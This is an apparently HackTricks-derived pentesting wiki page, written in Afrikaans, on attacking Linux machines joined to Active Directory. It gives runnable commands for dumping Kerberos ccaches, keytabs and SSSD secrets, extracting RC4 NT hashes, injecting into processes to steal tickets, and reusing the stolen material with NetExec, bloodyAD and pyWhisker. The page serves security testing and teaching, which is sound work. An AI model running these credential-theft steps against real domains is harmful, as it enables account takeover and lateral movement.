# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

'n Linux-masjien kan ook binne 'n Active Directory-omgewing voorkom.

'n Linux-masjien binne 'n AD kan **Kerberos-materiaal plaaslik stoor**: gebruiker-ccaches, masjien-/diens-keytabs en SSSD-bestuurde geheime. Hierdie artefakte kan gewoonlik soos enige ander Kerberos-credential hergebruik word. Om die meeste daarvan te lees, moet jy gewoonlik die gebruiker-eienaar van die ticket of **root** op die masjien wees.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumerasie

### AD-enumerasie vanaf linux

As jy toegang tot 'n AD in linux (of bash in Windows) het, kan jy [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) probeer om die AD te enumereer.

Jy kan ook die volgende bladsy nagaan om **ander maniere te leer om AD vanaf linux te enumereer**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA is 'n oopbron-**alternatief** tot Microsoft Windows **Active Directory**, hoofsaaklik vir **Unix**-omgewings. Dit kombineer 'n volledige **LDAP-gids** met 'n MIT **Kerberos** Key Distribution Center vir bestuur soortgelyk aan Active Directory. Deur die Dogtag **Certificate System** vir CA- en RA-sertifikaatbestuur te gebruik, ondersteun dit **multi-faktor**-verifikasie, insluitend slimkaarte. SSSD is geïntegreer vir Unix-verifikasieprosesse.<sup>[[14]](#references)[[15]](#references)</sup> Leer meer daaroor by:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakte op domeingekoppelde gashere

Voordat jy aan tickets raak, bepaal **hoe die gasheer aan AD gekoppel is** en **waar Kerberos-materiaal werklik gestoor word**. Op moderne Linux-gashere word dit gewoonlik deur `realmd` + `adcli` + `sssd` hanteer, nie net deur plat lêers in `/tmp` nie.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Dit vertel jou vinnig of die host AD vertrou, of SSSD identiteite of tickets cache, en of **machine/service keytabs** of **KCM secrets** beskikbaar is vir misbruik.<sup>[[4]](#references)[[10]](#references)</sup>

## Werk met tickets

### Pass The Ticket

Op hierdie bladsy sal jy verskillende plekke vind waar jy **Kerberos-tickets binne ’n Linux-host kan vind**; op die volgende bladsy kan jy leer hoe om hierdie CCache-ticket-formate na Kirbi te transformeer (die formaat wat jy in Windows moet gebruik), asook hoe om ’n PTT-aanval uit te voer:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

As jy die **Linux-spesifieke ticket harvesting-workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ens.) wil hê, kyk na die toegewyde bladsy:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Hergebruik van CCACHE-tickets vanaf /tmp

CCACHE-lêers is binêre formate vir die **stoor van Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` is steeds algemeen, maar moderne Linux-deployments gebruik ook `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, of `KCM:%{uid}`. Gaan die **`KRB5CCNAME`**-omgewingsveranderlike en die `default_ccache_name`-instelling na voordat jy aanvaar dat tickets in `/tmp` gestoor word.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse vanaf keyring

**Kerberos tickets wat in ’n proses se geheue gestoor word, kan onttrek word**, veral wanneer die masjien se ptrace-beskerming gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). ’n Nuttige tool hiervoor is beskikbaar by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), wat die onttrekking vergemaklik deur in sessies in te spuit en tickets na `/tmp` te dump.<sup>[[1]](#references)[[16]](#references)</sup>

Om hierdie tool te konfigureer en te gebruik, word die stappe hieronder gevolg:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Hierdie prosedure sal probeer om in verskeie sessies te inject, wat sukses aandui deur onttrekte tickets in `/tmp` te stoor met die benoemingskonvensie `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Herbenutting van CCACHE tickets vanuit SSSD KCM

SSSD onderhou 'n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende sleutel word as 'n versteekte lêer by die pad `/var/lib/sss/secrets/.secrets.mkey` gestoor. By verstek is die sleutel slegs leesbaar indien jy **root**-toestemmings het.<sup>[[4]](#references)</sup>

Deur **`SSSDKCMExtractor`** met die --database- en --key-parameters aan te roep, sal die databasis geparseer en die **secrets gedekripteer** word.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Die extractor druk rou Kerberos JSON-payloads uit; skakel dit om na ’n bruikbare ticket-cache of ’n ander ticket-formaat voordat pass-the-cache/pass-the-ticket-bewerkings uitgevoer word.<sup>[[4]](#references)</sup>

### Vinnige keytab-triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Onttrek rekeninge uit /etc/krb5.keytab

Diensrekening-sleutels, wat noodsaaklik is vir dienste wat met root-voorregte werk, word veilig in **`/etc/krb5.keytab`**-lêers gestoor. Hierdie sleutels, soortgelyk aan wagwoorde vir dienste, vereis streng vertroulikheid.<sup>[[5]](#references)</sup>

Om die inhoud van die keytab-lêer te inspekteer, kan **`klist`** gebruik word. Op Linux druk `klist -k -K -e` die principals, sleutelweergawe-nommers, enkripsietipes en rou sleutelmateriale uit. As die sleuteltipe **23 / RC4-HMAC** is, is die sleutelwaarde ook die **NT hash** van daardie principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Vir Linux-gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC-hash te onttrek, wat vir NTLM-hash-hergebruik benut kan word. Let daarop dat dit slegs help wanneer die keytab steeds **etype 23 / RC4-HMAC**-materiaal bevat. In **AES-only**-omgewings kry jy moontlik nie ’n herbruikbare NT-hash nie, maar jy kan steeds direk met die keytab via Kerberos autentiseer.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Op macOS dien **`bifrost`** as ’n hulpmiddel vir keytab-lêerontleding.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Deur die onttrekte rekening- en hash-inligting te gebruik, kan verbindings met bedieners met nutsmiddels soos **`NetExec`** bewerkstellig word.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Hergebruik die masjienrekening vanaf `/etc/krb5.keytab`

Op stelsels wat by `realmd`/`adcli`/`sssd` aangesluit is, bevat `/etc/krb5.keytab` gewoonlik die **rekenaarrekening** en een of meer **host/service principals**. As jy **root** het, moenie dit net dump nie: gebruik een van die principals wat deur `klist -k` gelys word om 'n TGT aan te vra en tree op as die Linux-host self.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Dit is veral nuttig wanneer die **computer object** self gedelegeerde regte in AD het, of wanneer die gasheer toegelaat word om ander secrets soos ’n **gMSA** te herwin.<sup>[[13]](#references)</sup>

### Hergebruik gesteelde Kerberos-materiaal met Linux-first AD-tooling

Sodra jy ’n geldige `ccache` of ’n bruikbare keytab het, kan jy direk vanaf **Linux** teen AD werk sonder om eers alles na Windows-formate om te skakel. Baie moderne tools aanvaar `KRB5CCNAME` / Kerberos-auth natively.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Dit is 'n goeie brug tussen **Linux post-exploitation** en **AD object abuse**. Vir die objekvlak-misbruikpaaie self, kyk na:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account-artefakte

Onlangse Linux-implementerings kan **Managed Service Accounts** direk vanaf AD gebruik. In die praktyk beteken dit dat jy, nadat jy 'n Linux-bediener gekompromitteer het, nie net die host keytab nie, maar ook **service-specific keytabs** wat vanaf 'n gMSA gegenereer is, kan vind. Algemene plekke om te ondersoek, is `/etc/gmsad.conf`, implementeringspesifieke konfigurasielêers en bykomende `*.keytab`-lêers onder `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Dit gee jou 'n herbruikbare Kerberos-identiteit vir die SPNs wat aan daardie gMSA gebind is **sonder om aan enige Windows-eindpunt te raak**.<sup>[[13]](#references)</sup> Vir **domeinkant**-gMSA/dMSA-misbruik nadat hoër voorregte in AD verkry is, kyk na:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Hoe om Kerberos aan te val?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Toegang tot AD met 'n bestuurde diensrekening – Integrasie van RHEL-stelsels direk met Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos-omgewingsveranderlikes – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Die RC4-HMAC Kerberos-enkripsietipes wat deur Microsoft Windows gebruik word](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Gebruik Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Ontdekking en aansluiting by identiteitsdomeine | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD-gebruikersgids](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Oor | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0-vrystellingsnotas](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – The Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
